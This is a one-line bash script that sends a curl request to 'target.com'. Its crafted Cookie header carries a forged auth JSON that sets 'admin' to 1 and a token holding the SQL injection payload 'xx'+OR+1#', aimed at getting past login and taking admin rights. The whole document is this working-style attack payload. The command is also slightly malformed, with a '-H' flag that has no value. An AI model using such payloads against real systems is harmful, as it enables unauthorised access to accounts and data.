#!/usr/bin/env bash

curl 'target.com' -H 'Cookie: PHPSESSID=3HSFfn3fef3fi3f3; auth={"username" : "`", "admin" : 1, "token" : "xx'+OR+1#"}' -H --compressed
